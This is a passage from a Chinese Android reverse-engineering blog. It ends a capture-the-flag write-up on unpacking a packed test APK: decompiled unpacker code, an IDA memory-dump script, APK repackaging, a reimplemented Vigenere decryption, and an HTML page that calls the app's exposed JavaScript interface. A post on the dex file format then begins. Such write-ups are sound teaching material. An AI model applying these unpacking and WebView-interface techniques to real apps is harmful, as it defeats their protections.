_android_log_print(3, \"debug\", \"the system already define LD_PRELOAD=%s\", v4); std::string::string(&amp;v84, v5, v52); v6 = v86; v7 = v85; while ( v6 != (unsigned __int8 *)v7 ) &#123; v8 = *v6++; if ( v8 == 32 ) *(v6 - 1) = 58; &#125; std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v87, &amp;v84, \":\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;v87, &amp;v64); std::string::_M_assign((std::string *)&amp;v64, v90, v89); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v88); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v87); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84); &#125; _android_log_print(3, \"debug\", \"the new LD_PRELOAD is %s\", v65); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v66, &amp;ali::g_filePath, \"/juice.data\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v67, &amp;ali::g_filePath, \"/fak.jar\"); fd = open(v68, 0); memset(&amp;s, 0, 0x14u); sprintf(&amp;s, \"%d\", fd); std::string::string(&amp;v69, &amp;s, v52); v73 = &amp;v72; v74 = &amp;v72; std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_allocate_block(&amp;v72, v55 - v56 + 10); *v73 = 0; std::string::_M_appendT&lt;char const*&gt;(&amp;v72, \"DEX_FILE=\", \"\", v52); std::string::append((std::string *)&amp;v72, (const std::string *)&amp;v54); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v75, &amp;v72, \" JUICE_FILE=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v76, &amp;v75, &amp;v66); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v77, &amp;v76, \" LD_PRELOAD=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v78, &amp;v77, &amp;v64); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;( &amp;v79, &amp;v78, \" /system/bin/dex2oat \\t\\t\\t\\t \\t --runtime-arg -Xms64m \\t\\t\\t\\t\\t --runtime-arg -Xmx64m \\t\\t\\t\\t\" \"\\t --boot-image=/system/framework/boot.art --zip-fd=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v80, &amp;v79, &amp;v69); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v81, &amp;v80, \"\\t\\t\\t\\t\\t --zip-location=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v82, &amp;v81, &amp;v67); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v83, &amp;v82, \"\\t\\t\\t\\t\\t --oat-file=\"); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v84, &amp;v83, &amp;v57); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v70, &amp;v84, \" \"); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v83); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v82); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v81); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v80); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v79); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v78); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v77); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v76); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v75); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v72); _android_log_print(3, \"debug\", \"cmd is %s\", v71); system(v71); close(fd); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v70); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v69); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v67); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v66); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v64); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v63);LABEL_24: _android_log_print(3, \"debug\", \"after oat gen\"); v10 = ali::JDexFile; v11 = dword_54140; if ( ali::sdk_int &lt;= 19 ) // sdk version &lt;= 19 &#123; v12 = _JNIEnv::NewStringUTF(v45, v60); v13 = _JNIEnv::NewStringUTF(v45, v58); v16 = _JNIEnv::CallStaticIntMethod(v45, v10, v11, v12, v13, 0); v18 = 0; &#125; else // sdk version &gt; 19 &#123; v14 = _JNIEnv::NewStringUTF(v45, v60); v15 = _JNIEnv::NewStringUTF(v45, v58); v16 = _JNIEnv::CallStaticLongMethod(v45, v10, v11, v14, v15, 0); v18 = v17; &#125; _android_log_print(3, \"debug\", \"cookie is %llx\"); *(_DWORD *)v46 = v16; *((_DWORD *)v46 + 1) = v18; v19 = (int (__fastcall *)(int, signed int))dlsym((void *)0xFFFFFFFF, \"_ZNK3art7DexFile12FindClassDefEt\"); _android_log_print(3, \"debug\", \"DexFile::FindClassDefFn is %p\", v19); v20 = v19(v16, 1); _android_log_print(3, \"debug\", \"call FindClassDefFn(%p,%d) =&gt; %p\", v16, 1, v20); _android_log_print(3, \"debug\", \"dex position is %p\", v20 - 572); _android_log_print(3, \"debug\", \"dex head is %08x %08x\", *(_DWORD *)(v20 - 572), *(_DWORD *)(v20 - 568)); v21 = *(unsigned __int8 **)(v20 - 540); _android_log_print(3, \"debug\", \"dex size is %d\", v21); MemEnableWrite((unsigned __int8 *)(v20 - 572), &amp;v21[v20 - 572]); std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v61, &amp;ali::g_filePath, \"/juice.data\"); if ( !ali::dex_juicer_patch((ali *)(v20 - 572), v21, v62, v22) ) &#123; std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57); v23 = &amp;v54;LABEL_44: std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v23); _android_log_print(3, \"debug\", \"exit parse_dex\"); return 0; &#125; _android_log_print(6, \"debug\", \"fail to patch dex\"); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59); std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57); v24 = &amp;v54;LABEL_46: std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v24); _android_log_print(3, \"debug\", \"exit parse_dex error\"); return -1;&#125; 在 openWithHeader 中，log 了三次 dex 的 magic number，中间分别进行了 RC4 解密和 LZMA 解压缩。最后得到的结果应该就是最终的 dex 文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124int __fastcall ali::EncFile::openWithHeader(ali::EncFile *this, unsigned __int8 **a2, unsigned int *a3, unsigned int a4)&#123; ali::EncFile *v4; // r5 unsigned __int8 **v5; // r11 unsigned int *v6; // r6 unsigned int v7; // r7 const char *v8; // r2 int fd; // r8 int v10; // r10 __blksize_t v12; // r3 unsigned __int8 *v13; // r4 ali *v14; // r0 __int64 v15; // r0 __int64 v16; // ST18_8 unsigned int *v17; // r3 ali *v18; // r0 __int64 v19; // r0 int v20; // r8 int v21; // r3 char v22; // r2 unsigned __int64 v23; // r0 ali *v24; // r0 unsigned __int8 *v25; // r9 ali *v26; // ST24_4 __int64 v27; // r0 __int64 v28; // ST18_8 ali *v29; // r0 __int64 v30; // r0 size_t v31; // [sp+2Ch] [bp-9Ch] int v32; // [sp+30h] [bp-98h] char v33; // [sp+34h] [bp-94h] struct stat buf; // [sp+38h] [bp-90h] v4 = this; v5 = a2; v6 = a3; v7 = a4; if ( !*((_DWORD *)this + 2) ) &#123; v8 = \"file path is null\";LABEL_5: _android_log_print(6, \"debug\", v8); return 0; &#125; fd = open(*((const char **)this + 2), 0); v10 = fstat(fd, &amp;buf); if ( v10 ) &#123; v8 = \"fstat failed\"; goto LABEL_5; &#125; v12 = buf.st_blksize; *v6 = buf.st_blksize; *(_DWORD *)v4 = v12; v13 = (unsigned __int8 *)mmap(0, *v6, 3, 2, fd, 0); *((_DWORD *)v4 + 1) = v13; close(fd); v14 = (ali *)_android_log_print( 3, \"debug\", \"dex magic %c %c %c %c %c %c %c\",// original dex magic *v13, v13[1], v13[2], v13[3], v13[4], v13[5], v13[6]); LODWORD(v15) = ali::NanoTime(v14); v16 = v15; v18 = (ali *)ali::decryptRc4((ali *)v13, v13, (unsigned __int8 *)v6, v17);// RC4 decrypt LODWORD(v19) = ali::NanoTime(v18); ali::PrettyDuration((ali *)(v19 - v16), v19 - v16); _android_log_print(3, \"debug\", \"decrypted len:%u\", *v6); v20 = 0; _android_log_print( 3, \"debug\", \"after decrypt dex magic %c %c %c %c %c %c %c\",// dex magic after RC4 *v13, v13[1], v13[2], v13[3], v13[4], v13[5], v13[6]); v21 = (int)(v13 + 4); do &#123; v22 = 8 * v10++; v23 = (unsigned __int64)*(unsigned __int8 *)(v21++ + 1) &lt;&lt; v22; v20 += v23; &#125; while ( v10 != 8 ); _android_log_print(3, \"debug\", \"unpackSize: %u\", v20); *(_DWORD *)v4 = v7 + v20; v24 = (ali *)mmap(0, v7 + v20, 3, 34, -1, 0); *((_DWORD *)v4 + 1) = v24; v25 = (unsigned __int8 *)v24 + v7; v26 = v24; LODWORD(v27) = ali::NanoTime(v24); v31 = *v6; v28 = v27; v32 = v20; v29 = (ali *)LzmaDecode(v25, &amp;v32, v13 + 13, &amp;v31, v13, 5, 1, &amp;v33, &amp;off_54028);// LZMA uncompress LODWORD(v30) = ali::NanoTime(v29); ali::PrettyDuration((ali *)(v30 - v28), v30 - v28); munmap(v13, buf.st_blksize); _android_log_print( 3, \"debug\", \"after uncompressed dex magic %c %c %c %c %c %c %c\",// dex magic after LZMA *((unsigned __int8 *)v26 + v7), v25[1], v25[2], v25[3], v25[4], v25[5], v25[6]); *v6 = v20; if ( v5 ) *v5 = (unsigned __int8 *)*((_DWORD *)v4 + 1); return *((_DWORD *)v4 + 1);&#125; Dump Dex File知道了解析 dex 的流程，接下来就通过动态调试来吧 dex 文件 dump 下来。现在 BL 跳转到 openWithHeader 的语句处设下断点： 12345678.text:00026A7E loc_26A7E ; CODE XREF: parse_dex(_JNIEnv *,long long *)+622↑j.text:00026A7E MOV R1, R9 ; unsigned __int8 **.text:00026A80 MOV R2, R4 ; unsigned int *.text:00026A82 MOVS R3, #0x10 ; unsigned int.text:00026A84 BL _ZN3ali7EncFile14openWithHeaderEPPhPjj ; ali::EncFile::openWithHeader(uchar **,uint *,uint).text:00026A88 LDR.W R3, [R9].text:00026A8C ADDS R3, #0x10.text:00026A8E STR R3, [R6] 运行到断点处，单步步入 openWithHeader 函数，然后单步步过一直到 return，中间可以在 monitor 中用 tag:debug 过滤来查看 log。运行完后看到 log 输出的 magic number 已经是真实 dex 文件的样子了： 根据函数的返回值存放在 R0 中，可以看到 R0 所指向的部分是一个 dex 文件的数据了： 接下来我们可以把 dex 文件给 dump 下来。但文件的大小为多少？根据 dex 的数据结构，可以知道 dex 文件的大小位于偏移 0x20 处： 接下来使用 IDC 脚本来 dump 数据： 12345678910static main(void) &#123; auto fp, begin, end, len, b; fp = fopen(\"dump.dex\", \"wb\"); begin = 0x7584C010; // 解密后数据在内存中的位置 len = 0x0941FC; // 文件大小 end = begin + len; for (b = begin; b &lt; end; b++) &#123; fputc(Byte(b), fp); &#125;&#125; 最后将 dump 下来的数据放进 JEB 中，反汇编可以得到真实的 MainActivity 代码： Fix Application使用 AndroidKiller 反编译加固后的 apk，找到 AndroidManifest.xml，删除 Application 的 android:name 属性： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.ali.tg.testapp\" platformBuildVersionCode=\"23\" platformBuildVersionName=\"6.0-2438415\"&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/&gt; &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt; &lt;application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme\"&gt; &lt;activity android:label=\"@string/app_name\" android:name=\".MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\"/&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\".WebViewActivity\"/&gt; &lt;/application&gt;&lt;/manifest&gt; 回编译后，找到生成的 apk，压缩软件打开，替换我们 dump 出来的 classes.dex，同时删除 assets 文件夹，其他 so 文件不用管。修改完后重新签名打包并安装运行，可以正常使用。 Find Flag定位到真实的程序后，开始分析具体的内容。先来看 MainActivity，主要是一个点击事件，其中获取了 EditText 中的字符串并作为参数传入并启动 WebViewActivity： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.ali.tg.testapp;import android.app.Activity;import android.content.Intent;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.view.View$OnClickListener;import android.view.View;import android.widget.Button;import android.widget.EditText;public class MainActivity extends Activity &#123; class com.ali.tg.testapp.MainActivity$1 implements View$OnClickListener &#123; com.ali.tg.testapp.MainActivity$1(MainActivity arg1) &#123; MainActivity.this = arg1; super(); &#125; public void onClick(View arg6) &#123; ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); String v1 = MainActivity.this.edit.getText().toString(); // 获取EditText中的字符串 Intent v0 = new Intent(); v0.putExtra(ListViewAutoScrollHelpern.decrypt_native(\"dV.\", 2), v1); // 将v1的值传给Intent，变量名为“dV.”解密后的值 v0.setClass(MainActivity.this, WebViewActivity.class); // 设置Intent要跳转的类为WebViewActivity MainActivity.this.startActivity(v0); // 启动WebViewActivity &#125; &#125; Button btn_enter; View$OnClickListener btn_listener; EditText edit; public MainActivity() &#123; super(); this.btn_enter = null; this.edit = null; this.btn_listener = new com.ali.tg.testapp.MainActivity$1(this); &#125; protected void onCreate(Bundle arg4) &#123; ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); super.onCreate(arg4); this.setContentView(0x7F030000); this.edit = this.findViewById(0x7F060001); this.btn_enter = this.findViewById(0x7F060002); this.btn_enter.setOnClickListener(this.btn_listener); &#125;&#125; 然后来看看 WebViewActivity，主要就是新建了一个 JavaScriptInterface 对象，对象的名称同样被加密了。然后加载输入的 url，目标是最后能够成功调用对象 JavaScriptInterface 里的 showToast 方法。接下来需要根据密文解出对象名，并构造出相应的网页来弹出 Toast。不过这里好像 flag 就是“祥龙”，但还是继续往下尝试构造出能够弹 Toast 的方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package com.ali.tg.testapp;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.webkit.WebSettings;import android.webkit.WebView;import android.widget.Toast;public class WebViewActivity extends Activity &#123; public class JavaScriptInterface &#123; Context mContext; JavaScriptInterface(WebViewActivity arg1, Context arg2) &#123; WebViewActivity.this = arg1; super(); this.mContext = arg2; &#125; public void showToast() &#123; // 构造出一个页面能够调用这个函数就成功了 ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); Toast.makeText(this.mContext, \"祥龙！\", 0).show(); &#125; &#125; WebView wView; public WebViewActivity() &#123; super(); this.wView = null; &#125; protected void onCreate(Bundle arg7) &#123; ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a()); super.onCreate(arg7); this.setContentView(0x7F030001); this.wView = this.findViewById(0x7F060004); WebSettings v2 = this.wView.getSettings(); v2.setJavaScriptEnabled(true); v2.setJavaScriptCanOpenWindowsAutomatically(true); this.wView.addJavascriptInterface(new JavaScriptInterface(this, ((Context)this)), ListViewAutoScrollHelpern.decrypt_native(\"BQ1$*[w6G_\", 2)); // 添加一个JavascriptInterface对象，对象的变量名为“BQ1$*[w6G_”解密后的值 this.wView.loadUrl(this.getIntent().getStringExtra(ListViewAutoScrollHelpern.decrypt_native(\"dV.\", 2))); // 把在MainActivity中获取的变量作为url来加载 &#125;&#125; Crack接下来再看看 ListViewAutoScrollHelpern 中的 decrypt_native 方法，发现是在 Native 层中的 translate 库实现的： 123456789101112131415161718192021222324package android.support.v4.widget;import android.util.Log;public class ListViewAutoScrollHelpern &#123; static &#123; System.loadLibrary(\"translate\"); &#125; public ListViewAutoScrollHelpern() &#123; super(); &#125; public static native String decrypt_native(String arg0, int arg1) &#123; &#125; public static void testLogv(String arg1) &#123; Log.v(\"cheatecore\", arg1); &#125; public static void testLogw(String arg1) &#123; Log.w(\"cheatecore\", arg1); &#125;&#125; 然后将 libtranslat.so 载入 IDA。先看看 JNI_OnLoad，其中有两个函数 register_Algorithm 和 register_translate： 12345678910111213141516171819202122int __fastcall JNI_OnLoad(_JavaVM *a1)&#123; int v1; // r1 jint v2; // r2 _JNIEnv *v3; // r4 jint v4; // r0 bool v5; // cf int result; // r0 _JNIEnv *env; // [sp+4h] [bp-Ch] env = 0; if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;env, 65540) ) return -1; v3 = env; register_Algorithm(env, v1, v2); v4 = register_translate(v3); v5 = v4 &lt; 0; result = v4 &amp; (v4 &gt;&gt; 32); if ( !v5 ) result = 65540; return result;&#125; 在 register_Algorithm 中发现了目标函数： 12345678910111213int __fastcall register_Algorithm(_JNIEnv *a1, int a2, jint a3)&#123; _JNIEnv *v3; // r4 jclass v4; // r0 jclass v5; // r0 v3 = a1; v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, \"android/support/v4/widget/ListViewAutoScrollHelpern\"); v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v4, (const JNINativeMethod *)off_607C, 1); v5 = v3-&gt;functions-&gt;FindClass(&amp;v3-&gt;functions, \"android/support/v4/view/PagerTitleStripIcsn\"); v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v5, (const JNINativeMethod *)off_607C, 1); return 0;&#125; 定位到目标函数，发现其中调用了一个 vigenere_decrypt： 12345678910111213141516171819202122232425262728jstring __fastcall decrypt_native(_JNIEnv *a1, jobject a2, jstring a3, jint a4)&#123; jstring data; // r6 jint num; // r9 _JNIEnv *env; // r4 const char *v7; // r0 const char *v8; // r8 jstring v9; // r7 int v11; // [sp+4h] [bp+0h] data = a3; num = a4; env = a1; memset(&amp;v11, 0, 0x1000u); v7 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, data, 0); v8 = v7; if ( num == 2 ) &#123; vigenere_decrypt(v7, (char *)&amp;v11); v9 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, (const char *)&amp;v11); &#125; else &#123; v9 = data; &#125; env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, data, v8); return v9;&#125; 在 vigenere_decrypt 函数中，对输入的数据进行了解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263signed int __fastcall vigenere_decrypt(const char *ciphertext, char *plaintext)&#123; const char *ciphertext_1; // r8 char *plaintext_1; // r6 size_t len; // r0 char *v5; // r2 const char *table; // r3 signed int v7; // r7 int v8; // r0 int v9; // r1 int v10; // r5 int v11; // r0 int v12; // r10 char v13; // r3 signed int i; // r5 signed int result; // r0 signed int v16; // r9 int ch; // r3 char s; // [sp+4h] [bp-64h] char v19; // [sp+48h] [bp-20h] ciphertext_1 = ciphertext; plaintext_1 = plaintext; len = strlen(ciphertext); v5 = &amp;s; table = \"ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU\"; v7 = len; do &#123; v8 = *(_DWORD *)table; table += 8; v9 = *((_DWORD *)table - 1); *(_DWORD *)v5 = v8; *((_DWORD *)v5 + 1) = v9; v10 = (int)(v5 + 8); v5 += 8; &#125; while ( table != \"tCQU\" ); v11 = *(_DWORD *)table; v12 = 0; v13 = table[4]; *(_DWORD *)v10 = v11; *(_BYTE *)(v10 + 4) = v13; i = 0; result = strlen(&amp;s); v16 = result; while ( i &lt; v7 ) &#123; ch = (unsigned __int8)ciphertext_1[i]; if ( ch - 32 &lt;= (unsigned int)'^' ) // chr(ch) &lt;= 127 &#123; plaintext_1[i] = (ch - (unsigned __int8)*(&amp;v19 + v12 - 68) + 95) % 95 + 32;// &amp;v19 - 68 = &amp;table result = (v12 + 1) / v16; v12 = (v12 + 1) % v16; &#125; else // chr(ch) &gt; 127 &#123; plaintext_1[i] = ch; &#125; ++i; &#125; return result;&#125; 我先是通过动态调试来获取到了两个字符串的解密结果： 然后尝试自己实现一个解密函数进行验证： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char *table = \"ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU\";char *vigenere_decrypt(char *ciphertext) &#123; int j = 0; int len = strlen(ciphertext); printf(\"%d\\n\", len); char plaintext[len]; for (int i = 0; i &lt; len; i++) &#123; char ch = ciphertext[i]; if ((ch - 32) &lt;= 0x5E) &#123; plaintext[i] = (ch - table[j] + 95) % 95 + 32; j = (j + 1) % 16; &#125; else &#123; plaintext[i] = ch; &#125; &#125; plaintext[len] = '\\x00'; return plaintext;&#125;int main() &#123; char *ciphertext1 = \"dV.\"; char *plaintext1 = vigenere_decrypt(ciphertext1); printf(\"%s\\n\", plaintext1); // url char *ciphertext2 = \"BQ1$*[w6G_\"; char *plaintext2 = vigenere_decrypt(ciphertext2); printf(\"%s\\n\", plaintext2); // SmokeyBear return 0;&#125; 当然这里也可以 Hook 这个 so 文件，也可以直接编写代码调用 so 中的函数，条条大路通罗马。最后实现一个调用 Toast 的 html 页面： 12345678910111213141516&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;script type=\"text/javascript\"&gt; function alicrack() &#123; SmokeyBear.showToast(); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; Crack EvilAPK_3 &lt;script type=\"text/javascript\"&gt; alicrack(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 在软件中输入对应的地址，成功弹窗： Referenceshttps://xz.aliyun.com/t/383https://blog.csdn.net/AliMobileSecurity/article/details/53259788https://yq.aliyun.com/articles/64691http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"android","slug":"android","permalink":"qianfei11.coding.me/tags/android/"}]},{"title":"Android逆向入门（四）","slug":"[TODO]Android逆向入门（四）","date":"2020-02-14T06:21:40.000Z","updated":"2020-02-25T07:02:46.565Z","comments":true,"path":"2020/02/14/[TODO]Android逆向入门（四）/","link":"","permalink":"qianfei11.coding.me/2020/02/14/[TODO]Android逆向入门（四）/","excerpt":"Android 加壳和脱壳入门。","text":"Android 加壳和脱壳入门。 dex 文件格式Android 程序编译以后生成 apk 文件，里面的 classes.dex 文件存放着程序运行的字节码，dex 文件是可以直接在 Dalvik 虚拟机中加载运行的文件。由于 Dalvik 是一种针对嵌入式设备而特殊设计的 Java 虚拟机，所以 dex 文件与标准的 class 文件在结构设计上有着本质的区别。当 Java 程序编译成 class 后，还需要使用 dx 工具将所有的 class 文件整合到一个 dex 文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，dex 文件是传统 jar 文件大小的 50% 左右。要想手工脱壳，必须先了解 dex 的文件格式。 ShakaApktool 使用 bs 命令即可对 class.dex 实现反编译回 smali 文件字节码，而使用 s 命令可以把 smali 字节码编译为 class.dex 文件： 12java -jar ShakaApktool bs classes.dex -o smali-dirjava -jar ShakaApktool s smali-dir -o example.dex dex 文件的数据结构大概如下： 数据名称 解释 header dex 文件头部，记录整个 dex 文件的相关属性 string_ids 字符串数据索引，记录了每个字符串在数据区的偏移量 type_ids 类似数据索引，记录了每个类型的字符串索引 proto_ids 原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表 field_ids 字段数据索引，记录了所属类，类型以及方法名 method_ids 类方法索引，记录方法所属类名，方法声明以及方法名等信息 class_defs 类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量 data 数据区，保存了各个类的真是数据 link_data 连接数据区 这里先看一下 Android 源码，首先在 /dalvik/vm/Common.h 中对数据类型有一个重命名： 1234567891011/* * These match the definitions in the VM specification. */typedef uint8_t u1;typedef uint16_t u2;typedef uint32_t u4;typedef uint64_t u8;typedef int8_t s1;typedef int16_t s2;typedef int32_t s4;typedef int64_t s8; 所有 dex 文件相关的数据结构都在 /dalvik/libdex/DexFile.h 中。dex 文件的结构如下： 123456789101112131415161718192021222324252627282930313233343536/* * Structure representing a DEX file. * * Code should regard DexFile as opaque, using the API calls provided here * to access specific structures. */struct DexFile &#123; /* directly-mapped \"opt\" header */ const DexOptHeader* pOptHeader; /* pointers to directly-mapped structs and arrays in base DEX */ const DexHeader* pHeader; const DexStringId* pStringIds; const DexTypeId* pTypeIds; const DexFieldId* pFieldIds; const DexMethodId* pMethodIds; const DexProtoId* pProtoIds; const DexClassDef* pClassDefs; const DexLink* pLinkData; /* * These are mapped out of the \"auxillary\" section, and may not be * included in the file. */ const DexClassLookup* pClassLookup; const void* pRegisterMapPool; // RegisterMapClassPool /* points to start of DEX file data */ const u1* baseAddr; /* track memory overhead for auxillary structures */ int overhead; /* additional app-specific data structures associated with the DEX */ //void* auxData;&#125;; dex 文件结构分别为文件头、索引区和数据区： dex 文件头文件头中简单记录了 dex 文件的一些基本信息，以及大致的数据分布。长度固定为 0x70，其中每一项信息所占用的内存空间也是固定的，好处是虚拟机在处理 dex 时不用考虑 dex 文件的多样性： 字段名称 偏移值 长度 说明 magic 0x00 8 魔数字段，值为”dex\\n035\\0” checksum 0x08 4 校验码 signature 0x0c 20 sha-1 签名 file_size 0x20 4 dex 文件总长度 header_size 0x24 4 文件头长度，009 版本=0x5c,035 版本=0x70 endian_tag 0x28 4 标示字节顺序的常量 link_size 0x2c 4 链接段的大小，如果为 0 就是静态链接 link_off 0x30 4 链接段的开始位置 map_off 0x34 4 map 数据基址 string_ids_size 0x38 4 字符串列表中字符串个数 string_ids_off 0x3c 4 字符串列表基址 type_ids_size 0x40 4 类列表里的类型个数 type_ids_off 0x44 4 类列表基址 proto_ids_size 0x48 4 原型列表里面的原型个数 proto_ids_off 0x4c 4 原型列表基址 field_ids_size 0x50 4 字段个数 field_ids_off 0x54 4 字段列表基址 method_ids_size 0x58 4 方法个数 method_ids_off 0x5c 4 方法列表基址 class_defs_size 0x60 4 类定义标中类的个数 class_defs_off 0x64 4 类定义列表基址 data_size 0x68 4 数据段的大小，必须 4k 对齐 data_off 0x6c 4 数据段基址 文件头的数据结构如下： 12345678910111213141516171819202122232425262728/* * Direct-mapped \"header_item\" struct. */struct DexHeader &#123; u1 magic[8]; /* includes version number */ u4 checksum; /* adler32 checksum */ u1 signature[kSHA1DigestLen]; /* SHA-1 hash */ u4 fileSize; /* length of entire file */ u4 headerSize; /* offset to start of next section */ u4 endianTag; u4 linkSize; u4 linkOff; u4 mapOff; u4 stringIdsSize; u4 stringIdsOff; u4 typeIdsSize; u4 typeIdsOff; u4 protoIdsSize; u4 protoIdsOff; u4 fieldIdsSize; u4 fieldIdsOff; u4 methodIdsSize; u4 methodIdsOff; u4 classDefsSize; u4 classDefsOff; u4 dataSize; u4 dataOff;&#125;; 索引区索引区包括 